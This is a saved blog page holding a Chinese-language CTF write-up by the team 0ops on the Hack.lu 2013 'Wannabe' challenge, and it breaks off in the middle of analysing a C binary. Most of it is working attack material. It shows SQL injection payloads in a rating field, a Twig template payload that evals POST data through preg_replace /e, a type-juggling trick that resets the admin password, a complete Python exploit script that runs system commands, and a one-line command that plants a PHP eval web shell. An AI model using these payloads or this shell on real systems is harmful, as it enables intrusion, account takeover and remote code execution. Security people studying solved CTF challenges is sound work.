<!DOCTYPE html>
<!-- saved from url=(0081)http://blog.0ops.net/blog/2013/10/29/hack-dot-lu-ctf-2013-exploiting-400-wannabe/ -->
<html class="js video maskImage placeholder" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <title>Hack.lu CTF 2013 Exploiting 400 Wannabe - 0ops...</title>
  <meta name="author" content="0ops">

  
  <meta name="description" content="Wannabe 这道题目非常难（调了很长时间），主要在于Web和Exploiting的结合这使得对于解题选手的综合要求非常高，整个解题的环节也非常多，而且里面有很多tricky的东西。 首先是一个Web页面。一开始的话看到有留言，不过XSS无效。然后又发现了在cookie里面有蹊跷， …">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">

  
  <link rel="canonical" href="./hacklu-ctf-2013-exp400-wannable-0ops_files/hacklu-ctf-2013-exp400-wannable-0ops.html">
  <link href="./hacklu-ctf-2013-exp400-wannable-0ops_files/favicon.png" rel="icon">
  <link href="./hacklu-ctf-2013-exp400-wannable-0ops_files/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script type="text/javascript" async="" src="./hacklu-ctf-2013-exp400-wannable-0ops_files/ga.js"></script><script src="./hacklu-ctf-2013-exp400-wannable-0ops_files/modernizr-2.0.js"></script><style type="text/css"></style>
  <script src="./hacklu-ctf-2013-exp400-wannable-0ops_files/ender.js"></script>
  <script src="./hacklu-ctf-2013-exp400-wannable-0ops_files/octopress.js" type="text/javascript"></script>
  <link href="http://blog.0ops.net/atom.xml" rel="alternate" title="0ops..." type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="./hacklu-ctf-2013-exp400-wannable-0ops_files/css" rel="stylesheet" type="text/css">
<link href="./hacklu-ctf-2013-exp400-wannable-0ops_files/css(1)" rel="stylesheet" type="text/css">
<link href="./hacklu-ctf-2013-exp400-wannable-0ops_files/css(2)" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-45274893-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


<script type="text/javascript" async="" src="./hacklu-ctf-2013-exp400-wannable-0ops_files/embed.js"></script></head>

<body>
  <header role="banner"><hgroup>
  <h1><a href="http://blog.0ops.net/">0ops...</a></h1>
  
    <h2>New team and new blog.</h2>
  
</hgroup>

</header>
  <div id="navigation">
    <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="http://blog.0ops.net/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:blog.0ops.net">
    <input class="search" type="text" name="q" results="0" placeholder="Search">
  </fieldset><fieldset class="mobile-nav"><select><option value="">Navigate…</option><option value="http://blog.0ops.net/">» Blog</option><option value="http://blog.0ops.net/blog/archives">» Archives</option><option value="http://blog.0ops.net/atom.xml">» RSS</option></select></fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="http://blog.0ops.net/">Blog</a></li>
  <li><a href="http://blog.0ops.net/blog/archives">Archives</a></li>
</ul>

</nav>
  </div>
  <div id="body">
    <div id="main">
      <div id="content">
        <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Hack.lu CTF 2013 Exploiting 400 Wannabe</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-10-29T20:27:00+08:00" pubdate="" data-updated="true">Oct 29<span>th</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><p><strong>Wannabe</strong></p>

<p><img class="center" src="./hacklu-ctf-2013-exp400-wannable-0ops_files/wannabe-des.png"></p>

<p>这道题目非常难（调了很长时间），主要在于Web和Exploiting的结合这使得对于解题选手的综合要求非常高，整个解题的环节也非常多，而且里面有很多tricky的东西。</p>

<p>首先是一个Web页面。一开始的话看到有留言，不过XSS无效。然后又发现了在cookie里面有蹊跷，也许是一个cookie中的SQLi，不过事后的事实证明cookie的加密涉及到一个预定的SIGNATURE非常复杂，根本不能从这里突破。最后，我们把视线放到上传bug的页面上。</p>

<p>这里上传环节，四个参数。我们发现传上去的文件是可以下载下来的，于是想到是不是能通过某种方式把php的source code给下载下来。这里容易猜测涉及到的是INSERT语句，于是根据INSERT的语法，<code>Insert ... values ()</code> 类似的。在Rating域中发现了SQLi。修改post数据如下：</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">rating = 1, (select database()), 0x31, 1) -- --
</span><span class="line">title = 0ops</span></code></pre></td></tr></tbody></table></div></figure>


<p>在返回的页面中bug记录会多出一条，其中的title为db_auther正是数据库名。注入成功了。我们注意到第三项应该代表的是文件名。于是我们想到用文件名的hex编码去填充第三项，这样是不是就能把那个文件下载下来了呢？</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">rating = 1, 0x41, 0x696e6465782e706870,1) -- --
</span><span class="line">title = 0ops</span></code></pre></td></tr></tbody></table></div></figure>


<p>其中0x696e6465782e706870是”index.php”的16进制编码。果然在新的页面中多了一条，点击下载就可以把index.php下载下来了。打开看下，</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class=""><span class="line">require_once 'include/password-policy.php';
</span><span class="line">
</span><span class="line">include('extension/filter.php');
</span><span class="line">
</span><span class="line">include('include/config.php');
</span><span class="line">include('include/functions.php');
</span><span class="line">
</span><span class="line">include('include/Database.php');
</span><span class="line">include('include/User.php');
</span><span class="line">
</span><span class="line">foreach ($controllers as $controller) {
</span><span class="line">  include("controller/".$controller.".php");
</span><span class="line">}</span></code></pre></td></tr></tbody></table></div></figure>


<p>注意到了这些吗？用同样的手段把所有的页面全部都下载下来。要注意config.php里面有数据库的信息，User.php里面有数据表的信息,另外config里面列出了所有的controller所以可以把controller目录下的所有php都下载下来。接下来就是代码分析了。我们在filter.php里面发现了这个玩意儿。</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class=""><span class="line">&lt;?php
</span><span class="line">require_once 'twig/lib/Twig/SimpleFilter.php';
</span><span class="line">
</span><span class="line">$makestatus = new Twig_SimpleFilter('makestatus', function($string) {
</span><span class="line">  return preg_replace('/(red|green): (.*)/e', '\'&lt;div style="color:$1;"&gt;\'.strtolower("$2").\'&lt;/div&gt;\'', $string);
</span><span class="line">}, array('is_safe' =&gt; array('html')));
</span><span class="line">?&gt; </span></code></pre></td></tr></tbody></table></div></figure>


<p>注意到那个preg_replace里面的/e，它相当于把正则匹配出来的东西eval了一下。这件事情在php的官方文档里都提到了，/e非常危险。我们就要利用这个可以做一个php远程代码执行。我们先看看如何触发这个filter。</p>

<p>注意到config.php里面有Twig的配置信息，目录是skeleton。Twig其实是一套php模板系统，参考一下这个页面:</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">https://ctf.fluxfingers.net:1317/skeleton/panel.twig</span></code></pre></td></tr></tbody></table></div></figure>


<p>，我们发现模板格式调用的规范是类似于 <code>{ { text|StyleName } }</code> 这样的。所以我们可以用</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">{ { "red: {${eval($_POST[phpcode])}}"|makestatus } }</span></code></pre></td></tr></tbody></table></div></figure>


<p>类似的去做一个php远程代码执行。让我们看一下把他放在哪里吧？我们注意到PanelController.php页面：</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
</pre></td><td class="code"><pre><code class=""><span class="line">public function prevAction($db, $user) {
</span><span class="line">      global $twig;
</span><span class="line">      global $makestatus;
</span><span class="line">
</span><span class="line">      if (!$user-&gt;isAdmin())
</span><span class="line">          throw new Exception("You don't have the permission to view this site", 1);
</span><span class="line">
</span><span class="line">      if (!isset($_POST['title']))
</span><span class="line">          throw new Exception("Please enter a title");
</span><span class="line">
</span><span class="line">      if (!isset($_POST['text']))
</span><span class="line">          throw new Exception("Please enter a text");
</span><span class="line">
</span><span class="line">      $data = $db-&gt;select('password', 'user', "WHERE name='admin' LIMIT 1");
</span><span class="line">
</span><span class="line">      if (sha1($_POST['password']) !== $data[0]['password'])
</span><span class="line">          throw new Exception("You need to provide your admin password before you can perform an action");
</span><span class="line">
</span><span class="line">      $prev = $twig-&gt;loadTemplate("panel.twig");
</span><span class="line">      $out = $prev-&gt;render(array('title' =&gt; $_POST['title'], 'text' =&gt; $_POST['text'], 'author' =&gt; 'admin', 'created' =&gt; 'now', 'prev' =&gt; '1', 'admin' =&gt; $user-&gt;isAdmin()));
</span><span class="line">
</span><span class="line">      $tmp = new Twig_Environment(new Twig_Loader_String());
</span><span class="line">      $tmp-&gt;addFilter($makestatus);
</span><span class="line">
</span><span class="line">      echo $tmp-&gt;render($out); 
</span><span class="line">  }</span></code></pre></td></tr></tbody></table></div></figure>


<p>我们发现这里$makestatus派上用场了，它对往这个 <code>https://ctf.fluxfingers.net:1317/?site=panel&amp;action=prev</code> 的POST数据做了正则。所以我们只要往这个POST数据里的title或者text里填上上面提到那句话就可以了。但是事情没有那么简单，Panel仅仅是对admin可见的（在POST的过程中需要传admin的密码）。通过前面的注入包括后来的源代码已经发现了admin的密码在数据库中是sha1形式的，没办法获得。怎么办，我们把视线又转移到了这个页面LostController.php（一个用来重置密码的页面）。</p>

<p>通过前面的SQLi注入我们知道在数据中有两个帐户一个是admin一个是guest。第一个是重置密码需要reset code，但这个不要紧通过SQLi一查就出来了。但在页面前端试过就知道guest是可以重置密码的但是admin不能重置密码。这怎么办呢？看看LostController.php。</p>

<figure class="code"><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$data = $db-&gt;select("id", "user", "WHERE reset='".mysql_real_escape_string($code)."' AND reset &lt;&gt;''");
</span><span class="line">if (empty($data))
</span><span class="line">          throw new Exception("Invalid reset code");
</span><span class="line">if ($data[0]['id'] == $id) {
</span><span class="line">          $reset = array(
</span><span class="line">              'password' =&gt; "'".mysql_real_escape_string(sha1($pass))."'",
</span><span class="line">              'reset' =&gt; "''"
</span><span class="line">          );
</span><span class="line">
</span><span class="line">          $db-&gt;update("user", $reset, "WHERE id=".intval($id));
</span><span class="line">
</span><span class="line">          $this-&gt;vars['complete'] = "green: Password successfully reseted";
</span><span class="line">          $this-&gt;indexAction($db, $user);
</span><span class="line">      } else {
</span><span class="line">          throw new Exception("Invalid user-id specified");
</span><span class="line">      }</span></code></pre></td></tr></tbody></table></div></figure>


<p>Web部分的高潮大概就在这里。我们注意到guest的id是1，admin的id是0。这里$id是GET数据是我们给的。要知道我们通过SQLi只能拿guest的reset code，这样取出来$data[0][‘id’]是1，如果我们把$id给一个值是’0x1’，php弱类型比较那么很明显if语句是正确的。但是问题出在下面那个$db-&gt;update。<code>intval($id)=intval('0x1')=0</code>也就是说我们改掉了admin的密码。</p>

<p>我们基本搞定了Web部分，看下脚本吧。</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">hashlib</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">pycurl</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">StringIO</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">json</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">sys</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">re</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">base64</span>
</span><span class="line">
</span><span class="line"><span class="n">cookie</span> <span class="o">=</span> <span class="s">"user_id=89f7c94cf1be5c66932a9ba8081adbd; user_hash=f19f8da6c34b006ecde7f7c7048c2b849705d4d4; user_bugs=YTowOnt9; user_mac=caaba4854cf92c4a16a284e620937f9623fd321d"</span>
</span><span class="line"><span class="n">url</span> <span class="o">=</span> <span class="s">"https://ctf.fluxfingers.net:1317/?site=bug&amp;action=add"</span>
</span><span class="line"><span class="n">postData</span> <span class="o">=</span> <span class="p">{</span><span class="s">"rating"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
</span><span class="line">          <span class="s">"title"</span><span class="p">:</span> <span class="s">"asdf"</span>
</span><span class="line">          <span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">curl</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">postData</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">cookieJar</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
</span><span class="line">  <span class="n">pc</span> <span class="o">=</span> <span class="n">pycurl</span><span class="o">.</span><span class="n">Curl</span><span class="p">()</span>
</span><span class="line">  <span class="n">ret</span> <span class="o">=</span> <span class="n">StringIO</span><span class="o">.</span><span class="n">StringIO</span><span class="p">()</span>
</span><span class="line">  <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">URL</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span><span class="line">  <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">COOKIE</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
</span><span class="line">  <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">WRITEFUNCTION</span><span class="p">,</span> <span class="n">ret</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
</span><span class="line">  <span class="k">if</span> <span class="n">cookieJar</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class="line">      <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">COOKIEFILE</span><span class="p">,</span> <span class="s">"cookie.txt"</span><span class="p">)</span>
</span><span class="line">      <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">COOKIEJAR</span><span class="p">,</span> <span class="s">"cookie.txt"</span><span class="p">)</span>
</span><span class="line">  <span class="k">if</span> <span class="n">postData</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class="line">      <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pc</span><span class="o">.</span><span class="n">POSTFIELDS</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">postData</span><span class="p">))</span>
</span><span class="line">  <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">SSL_VERIFYHOST</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
</span><span class="line">  <span class="n">pc</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">SSL_VERIFYPEER</span><span class="p">,</span><span class="bp">False</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">  <span class="n">pc</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
</span><span class="line">  <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">reset</span><span class="p">():</span>
</span><span class="line">  <span class="n">postData</span><span class="p">[</span><span class="s">"rating"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"1, (SELECT concat(0x414141,reset,0x414141) from 6karuhf843_user where id=1), 0x31, 1) -- --"</span>
</span><span class="line">  <span class="n">result</span> <span class="o">=</span> <span class="n">curl</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">postData</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span><span class="line">  <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r"AAA(.+)AAA"</span><span class="p">,</span> <span class="n">result</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line">
</span><span class="line">  <span class="n">rc</span> <span class="o">=</span> <span class="n">result</span>
</span><span class="line">  <span class="n">pw</span> <span class="o">=</span> <span class="s">"0Ops"</span> <span class="o">*</span> <span class="mi">5</span>
</span><span class="line">  <span class="n">rUrl</span> <span class="o">=</span> <span class="s">"https://ctf.fluxfingers.net:1317/?action=update&amp;site=lost&amp;id=0x1&amp;pass=</span><span class="si">%s</span><span class="s">&amp;pass2=</span><span class="si">%s</span><span class="s">&amp;code=</span><span class="si">%s</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">rc</span><span class="p">)</span>
</span><span class="line">  <span class="k">print</span> <span class="n">curl</span><span class="p">(</span><span class="n">rUrl</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">tryVer</span><span class="p">():</span>
</span><span class="line">
</span><span class="line">  <span class="c">#reset()</span>
</span><span class="line">
</span><span class="line">  <span class="n">cookie</span> <span class="o">=</span> <span class="s">"user_id=e62552ab44206edaee9d25e57f6dc220; user_hash=4633e20cc0811f08419e4f650292dda905d1a2a2; user_bugs=YTowOnt9; user_mac=670f82f4a1d440158f6adba85f05b163852c3515"</span>
</span><span class="line">  <span class="n">pdata</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class="line">
</span><span class="line">  <span class="n">php</span> <span class="o">=</span> <span class="s">"system('</span><span class="si">%s</span><span class="s">');"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class="line">  <span class="n">pdata</span><span class="p">[</span><span class="s">"phpcode"</span><span class="p">]</span> <span class="o">=</span> <span class="n">php</span>
</span><span class="line">  <span class="n">pdata</span><span class="p">[</span><span class="s">"title"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"abc"</span>
</span><span class="line">  <span class="n">pdata</span><span class="p">[</span><span class="s">"text"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"{ { </span><span class="se">\"</span><span class="s">red: {${eval($_POST[phpcode])} }</span><span class="se">\"</span><span class="s">|makestatus } }"</span>
</span><span class="line">  <span class="n">pdata</span><span class="p">[</span><span class="s">"password"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0Ops"</span> <span class="o">*</span> <span class="mi">5</span>
</span><span class="line">
</span><span class="line">  <span class="n">rUrl</span> <span class="o">=</span> <span class="s">"https://ctf.fluxfingers.net:1317/?site=panel&amp;action=prev"</span>
</span><span class="line">  <span class="n">result</span> <span class="o">=</span> <span class="n">curl</span><span class="p">(</span><span class="n">rUrl</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">pdata</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
</span><span class="line">  
</span><span class="line">  <span class="c">#result = re.findall(r"er=\"News\" rows=\"5\"&gt;(.+)&lt;div style=\"color:red;\"&gt;&lt;/div&gt;&lt;/textarea&gt;", result, re.S)[0]</span>
</span><span class="line">
</span><span class="line">  <span class="k">print</span> <span class="n">result</span>
</span><span class="line">
</span><span class="line"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
</span><span class="line">  <span class="n">tryVer</span><span class="p">()</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>只要调用python脚本的时候给一个参数就能当系统命令执行啦。要注意脚本里面reset()是用来重置密码的，因为这中间cookie会变，所以pycurl的过程里要设置cookieJar。后面的命令执行不用。这里我们要做一个shell怎么搞呢？直接nc是不行的，因为主办方表示forbid了data traffic。我们只有在/var/www目录下（这是当前目录）的upload目录下面有读写权限，这点非常关键。有两个办法可以搞shell，第一个</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">python</span> <span class="n">attack</span><span class="o">.</span><span class="n">py</span> <span class="s">"echo </span><span class="se">\'</span><span class="s">&lt;?php @eval($_POST[</span><span class="se">\'</span><span class="s">pass</span><span class="se">\'</span><span class="s">]);?&gt;</span><span class="se">\'</span><span class="s"> &gt; ./upload/test.php"</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>之后用菜X去连大家明白的。</p>

<p>另外一种是后面bin部分也要用的方法就是在前台上传一个phpspy.php当然后缀名要改成jpg。然后我们用ls upload去看下它被改成了什么名字。之后用</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">python</span> <span class="n">attack</span><span class="o">.</span><span class="n">py</span> <span class="s">"cp ./upload/xxx.jpg ./upload/test.php"</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>之后大家都懂的。</p>

<p>WEB部分到这里就告一段落了。我们在/home/arthur目录下面发现了一个叫做sign_key.flag的文件应该就是key了可惜没有读权限。但是我们注意到在/home/arthuer/bin下面有一个control有一个control.c。显然的要开始做exploit啦！</p>

<p>看一下control.c，sign方法没什么希望exploit我们看看clean方法。</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">char</span> <span class="n">found</span><span class="p">[</span><span class="mi">255</span><span class="p">][</span><span class="mi">192</span><span class="p">];</span>
</span><span class="line"><span class="nb">int</span> <span class="n">cookie</span><span class="p">;</span>
</span><span class="line"><span class="n">void</span> <span class="n">inspect</span><span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span><span class="line">  <span class="n">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">255</span><span class="p">];</span>
</span><span class="line">  <span class="n">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">511</span><span class="p">];</span>
</span><span class="line">  <span class="n">char</span> <span class="o">*</span><span class="n">pos</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="s">"</span><span class="si">%s%s</span><span class="s">"</span><span class="p">,</span> <span class="n">check_dir</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">))</span> <span class="o">==</span> <span class="n">NULL</span><span class="p">)</span>
</span><span class="line">      <span class="k">return</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="mi">511</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="n">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="k">if</span> <span class="p">((</span><span class="n">pos</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="s">"system(</span><span class="se">\"</span><span class="s">"</span><span class="p">))</span> <span class="o">!=</span> <span class="n">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">          <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class="line">          <span class="n">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="s">"</span><span class="se">\"</span><span class="s">);"</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">          <span class="k">if</span> <span class="p">(</span><span class="n">end</span> <span class="o">==</span> <span class="n">NULL</span><span class="p">)</span>
</span><span class="line">              <span class="k">continue</span><span class="p">;</span>
</span><span class="line">
